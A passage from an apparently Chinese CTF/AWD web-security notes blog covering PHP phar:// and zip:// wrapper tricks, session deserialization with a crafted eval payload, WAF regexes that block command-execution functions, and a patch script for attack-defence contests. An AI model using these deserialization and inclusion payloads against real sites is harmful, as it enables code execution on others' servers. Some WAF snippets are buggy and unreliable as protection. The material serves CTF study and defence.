<p>既然都知道Phar文件的基本结构了，那么我们就写一段代码来测试一下<br>PS：php.ini中必须设置phar.readonly&#x3D;Off，不然Phar文件就会无法生成。</p>
<pre><code>&lt;?php
    class Test&#123;
        public $test=&quot;test&quot;;
    &#125;
    @unlink(&quot;test.phar&quot;);
    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
    $o = new Test();
    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
    $phar-&gt;stopBuffering();    //签名自动计算
?&gt;
</code></pre>
<p>查看一下phar文件的结构，可以看到Meta-data的内容是以反序列的形式储存的。</p>
<p>那序列化部分的内容怎么反序列呢？<br>在使用Phar:&#x2F;&#x2F; 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br><strong>小trick：系统文件操作的函数一般都能使用伪协议流，Phar:&#x2F;&#x2F; 也是ok的</strong><br>写一段小代码测试一下：</p>
<pre><code>&lt;?php
class Test&#123;
    function __destruct()&#123;
        echo &quot;test&quot;;
    &#125;
&#125;
file_get_contents(&quot;phar://./test.phar/test.txt&quot;);
?&gt;
</code></pre>
<p>可以看到成功触发了反序列化</p>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><p>类似phar:&#x2F;&#x2F;<br>使用方法和条件有点区别</p>
<p>条件</p>
<ul>
<li>压缩包需要zip协议压缩</li>
<li>php版本大于等于php5.3.0，windows下php还得小于5.4</li>
<li>不需要开启<code>allow_url_fopen</code>和<code>allow_url_include</code></li>
<li><code>#</code>编码为<code>%23</code>，接上压缩包内的文件</li>
<li>需要指定绝对路径</li>
</ul>
<pre><code>GET: ?filename=zip://shell.png%23shell.php

POST: cmd=phpinfo();
</code></pre>
<p>类似的还有<code>zlib://</code>协议和<code>bzip2://</code>协议</p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><pre><code>__sleep()	 	//使用serialize时触发，serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作 
__destruct() 	//对象被销毁时触发 
__call() 		//在对象上下文中调用不可访问的方法时触发 
__callStatic() 	//在静态上下文中调用不可访问的方法时触发 
__get() 		//用于从不可访问的属性读取数据
__set() 		//用于将数据写入不可访问的属性 
__isset() 		//在不可访问的属性上调用isset()或empty()触发 
__unset() 		//在不可访问的属性上使用unset()时触发 
__invoke() 		//当脚本尝试将对象调用为函数时触发
__wakeup()		//unserialize函数会检查是否存在wakeup方法，如果存在则先调用wakeup方法，做一些必要的初始化连数据库等操作
__construct() 	//PHP5允行在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法
__destruct()	//PHP5引入析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行
__toString()	//用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误
</code></pre>
<h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><p>首先php的session存储与读取是一个序列化跟反序列化的过程，其中有三种模式，分别是php_binary、php、php_serialize，这几个模式的存储方式不太一样，这也是会导致反序列化漏洞的根源</p>
<p>比如说是php_serialize的存储方式，那么我们可以通过构造一个上传表单，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在<code>$_SESSION</code>中获得<br>当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值<br>然后再session_start()函数，直接触发session反序列化漏洞</p>
<p>PHP session反序列化漏洞，简单点说，就是当网站序列化并存储Session与反序列化并读取Session的方式不同时就可能导致session反序列化漏洞的产生。</p>
<p> 漏洞Demo</p>
<p>save.php，和前面的demo一样，这里用的是php_serialize处理器：</p>
<pre><code>&lt;?php
ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
session_start();
$_SESSION[&#39;m7&#39;] = $_GET[&#39;m7&#39;];
?&gt;
</code></pre>
<p>session_vul.php，这里用的是默认的php处理器，可以不添加该行：</p>
<pre><code>&lt;?php 
ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
session_start();

class mi1k7ea&#123;
    var $a;
    function __destruct()&#123;
        eval($this-&gt;a);
    &#125;
    // function __destruct()&#123;
    //  system($this-&gt;a);
    // &#125;
    // function __sleep()&#123;
    // 	eval($this-&gt;a);
    // 	return array(&#39;a&#39;);
    // &#125;
    // function __wakeup()&#123;
    // 	eval($this-&gt;a);
    // &#125;
&#125;
?&gt;
</code></pre>
<p>访问包含恶意构造序列化对象的URL：</p>
<pre><code>save.php?m7=|O:7:&quot;mi1k7ea&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;
</code></pre>
<p>打开session文件可看到序列化存储的内容，再访问session_vul.php即可看到php代码被执行了</p>
<pre><code>session文件内部是：
a:1:&#123;s:2:&quot;m7&quot;;s:45:&quot;|O:7:&quot;mi1k7ea&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;
</code></pre>
<p>这是因为php引擎会以|作为key和value的分隔符，将a:1:{s:2:”m7”;s:45:”作为SESSION的key，将O:7:”mi1k7ea”:1:{s:1:”a”;s:10:”phpinfo();”;}作为value，然后进行反序列化，就会实例化mi1k7ea对象，最后就会执行__destruct()函数中的eval()方法，相当于执行如下：</p>
<pre><code>$_SESSION[&#39;m7&#39;] = new mi1k7ea();
$_SESSION[&#39;m7&#39;]-&gt;a = &#39;phpinfo();&#39;;
</code></pre>
<h1 id="各种waf"><a href="#各种waf" class="headerlink" title="各种waf"></a>各种waf</h1><h2 id="命令执行waf"><a href="#命令执行waf" class="headerlink" title="命令执行waf"></a>命令执行waf</h2><pre><code>function wafrce($str)&#123;
    return !preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $str);
&#125;
</code></pre>
<h2 id="sql注入waf"><a href="#sql注入waf" class="headerlink" title="sql注入waf"></a>sql注入waf</h2><pre><code>function wafsqli($str)&#123;
    return !preg_match(&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#39;|\^|\|/i&quot;, $str);
&#125;
$username = addslashes($username);
$password = addslashes($password);
</code></pre>
<h2 id="xss-waf"><a href="#xss-waf" class="headerlink" title="xss waf"></a>xss waf</h2><pre><code>function wafxss($str)&#123;
    return !preg_match(&quot;/\&#39;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;, $str);
&#125;
</code></pre>
<h2 id="目录穿越waf"><a href="#目录穿越waf" class="headerlink" title="目录穿越waf"></a>目录穿越waf</h2><pre><code>$action = (isset($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &#39;home.php&#39;);
$deny_ext = array(&quot;..&quot;,&quot;../&quot;);
if (in_array($action, $deny_ext))&#123;
    if (file_exists($action)) &#123;
        include $action;
            &#125; else &#123;
                echo &quot;File not found!&quot;;
            &#125;
        &#125;
</code></pre>
<h2 id="文件上传waf"><a href="#文件上传waf" class="headerlink" title="文件上传waf"></a>文件上传waf</h2><pre><code>&lt;?php
$allowed_extensions = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;); // 允许上传的文件后缀名

    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); // 获取文件后缀名并转换为小写
    
    if (!in_array($extension, $allowed_extensions)) &#123; // 检查文件后缀名是否在允许上传的列表中
     echo &quot;不允许上传该类型的文件！&quot;;
        
    &#125; else &#123;
        $target_file = &quot;uploads/&quot; . basename($filename); // 为上传文件指定目标路径
        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file); // 将文件从临时目录移动到目标路径
        echo &quot;文件上传成功！&quot;;
    &#125;
&#125; 
</code></pre>
<h2 id="文件包含漏洞waf"><a href="#文件包含漏洞waf" class="headerlink" title="文件包含漏洞waf"></a>文件包含漏洞waf</h2><pre><code>这玩意儿真的有waf吗，正常代码中真的会出现这种被包含文件可控的情况吗
</code></pre>
<p>主办方的exp一般都是最简单的那种，这样一般够了，然后是写patch包</p>
<p>假如我们的目标是ttttteeeessst.php，它是一个一句话后门，我们可以把我们的waf给加上：</p>
<pre><code>&lt;?php 
error_reporting(0);
highlight_file(__FILE__);
function wafrce($str)&#123;
    return !preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $str);
&#125;

system(wafrce($_POST[cmd]));
?&gt;
</code></pre>
<p>然后写update.sh(第一种是一般的默认路径，第二个是全局搜索ttttteeeessst.php然后把它作为路径覆盖，第二第三之所以看起来重复了，是因为我发现根目录下的话pwd出来是&#x2F;，&#x2F;&#x2F;ttttteeeessst.php是没法匹配到根目录下的ttttteeeessst.php的，导致文件重复了，而其他路径，比如&#x2F;var&#x2F;www，pwd出来就是&#x2F;var&#x2F;www，最后需要加一个&#x2F;)</p>
<pre><code>#!/bin/bash

cp ttttteeeessst.php /var/www/html/ttttteeeessst.php

cp ttttteeeessst.php $(dirname `find  / -not -path &quot;/ttttteeeessst.php&quot; -name &#39;ttttteeeessst.php&#39; 2&gt;/dev/null`)/ttttteeeessst.php

cp ttttteeeessst.php $(dirname `find  / -not -path &quot;$(pwd)/ttttteeeessst.php&quot; -name &#39;ttttteeeessst.php&#39; 2&gt;/dev/null`)
</code></pre>
<p>打包指令：</p>
<pre><code>tar zcvf update.tar.gz ttttteeeessst.php update.sh
</code></pre>
<p>解压指令：</p>
<pre><code>tar zxvf update.tar.gz
</code></pre>
<p>平台接受到后会自动chmod 777 update.sh然后运行</p>

        <div class="content" v-pre>
            <!-- 
    <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E5%A4%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-text">九大全局变量</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%BC%B1%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%87%BD%E6%95%B0"><span class="toc-text">二、弱类型以及各种函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B2%BE%E5%BA%A6%E7%BC%BA%E9%99%B7"><span class="toc-text">精度缺陷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E7%BC%BA%E9%99%B7"><span class="toc-text">类型转换缺陷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E7%AD%89%E4%BA%8E%E5%92%8C%E5%BC%BA%E7%AD%89%E4%BA%8E"><span class="toc-text">弱等于和强等于</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp"><span class="toc-text">strcmp()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval"><span class="toc-text">intval()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sha1-%E5%92%8Cmd5-%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0"><span class="toc-text">sha1() 和md5()加密函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#parse-str-%E5%87%BD%E6%95%B0"><span class="toc-text">parse_str()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric"><span class="toc-text">is_numeric()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#in-array"><span class="toc-text">in_array()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ereg-%E5%92%8Ceregi"><span class="toc-text">ereg()和eregi()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#json-decode"><span class="toc-text">json_decode()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-match"><span class="toc-text">preg_match()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace"><span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#register-globals%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">register_globals全局变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extract-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">extract()变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#import-request-variables-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">import_request_variables()变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E8%87%B4%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">$$导致的变量覆盖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strstr-%E5%87%BD%E6%95%B0"><span class="toc-text">strstr()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mt-rand-%E5%87%BD%E6%95%B0"><span class="toc-text">mt_rand()函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81"><span class="toc-text">php:&#x2F;&#x2F;输入输出流</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">session反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%84%E7%A7%8Dwaf"><span class="toc-text">各种waf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cwaf"><span class="toc-text">命令执行waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5waf"><span class="toc-text">sql注入waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-waf"><span class="toc-text">xss waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8Awaf"><span class="toc-text">目录穿越waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0waf"><span class="toc-text">文件上传waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9Ewaf"><span class="toc-text">文件包含漏洞waf</span></a></li></ol></li></ol>
    </div>
 -->
        </div>

        
        
        
        
        
        
        
    </div>
    <script src="/js/toc.js"></script>
    <script src="/js/code.js"></script>
</body>

                </div>
                
                    <transition name="fade">
                        <div id="preview" ref="preview" v-show="previewShow">
                            <img id="preview-content" ref="previewContent" />
                        </div>
                    </transition>
                    
        </div>
        <div id="loading_images2" ref="loading_images2" data-images="/images/cd/pic_rikibgm01_001.png,/images/cd/pic_rikibgm01_002.png,/images/cd/pic_rikibgm01_003.png,/images/cd/pic_rikibgm01_004.png,/images/cd/pic_rikibgm01_005.png,/images/cd/pic_rikibgm01_006.png,/images/cd/pic_rikibgm01_007.png,/images/cd/pic_rikibgm01_008.png,/images/cd/pic_rikibgm01_009.png,/images/cd/pic_rikibgm01_010.png,/images/cd/pic_rikibgm01_011.png"
            style="visibility: hidden;"></div>
        <div id="skin-background2" ref="skinbackground2" data-images="/images/skin/others/icon_girl001a_fashion02_1784.png,/images/skin/others/icon_girl002a_fashion01_1784.png,/images/skin/others/icon_girl002a_fashion02_1784.png,/images/skin/others/icon_girl002a_fashion03_1784.png,/images/skin/others/icon_girl002b_fashion02_1784.png,/images/skin/others/icon_girl002_fashion02_1784.png,/images/skin/others/icon_girl004a_fashion01_1784.png,/images/skin/others/icon_girl004a_fashion02_1784.png,/images/skin/others/icon_girl005a_fashion01_1784.png,/images/skin/others/icon_girl005a_fashion02_1784.png,/images/skin/others/icon_girl006a_fashion01_1784.png,/images/skin/others/icon_girl007a_fashion01_1784.png,/images/skin/others/icon_girl008a_fashion01_1784.png,/images/skin/others/icon_girl008a_fashion02_1784.png,/images/skin/others/icon_girl008a_fashion03_1784.png,/images/skin/others/icon_girl008a_fashion04_1784.png,/images/skin/others/icon_girl008b_fashion02_1784.png,/images/skin/others/icon_girl008_fashion02_1784.png,/images/skin/others/icon_girl010a_fashion01_1784.png,/images/skin/others/icon_girl010a_fashion02_1784.png,/images/skin/others/icon_girl010_fashion01_1784.png,/images/skin/others/icon_girl010_fashion02_1784.png,/images/skin/others/icon_girl011a_fashion01_1784.png,/images/skin/others/icon_girl011_fashion01_1784.png,/images/skin/others/icon_girl012a_fashion01_1784.png,/images/skin/others/icon_girl013a_fashion02_1784.png,/images/skin/others/icon_girl014a_fashion01_1784.png,/images/skin/others/icon_girl014a_fashion02_1784.png,/images/skin/others/icon_girl014a_fashion03_1784.png,/images/skin/others/icon_girl015_fashion01_1784.png,/images/skin/others/icon_girl015_fashion05_1784.png,/images/skin/others/icon_girl016_fashion01_1784.png,/images/skin/others/icon_girl016_fashion02_1784.png,/images/skin/others/icon_girl017_fashion01_1784.png,/images/skin/others/icon_girl017_fashion02_1784.png,/images/skin/others/icon_girl018_fashion02_1784.png"
            style="visibility: hidden;"></div>
        <script src="/js/main.js"></script>
        
            




                
    </body>

    </html>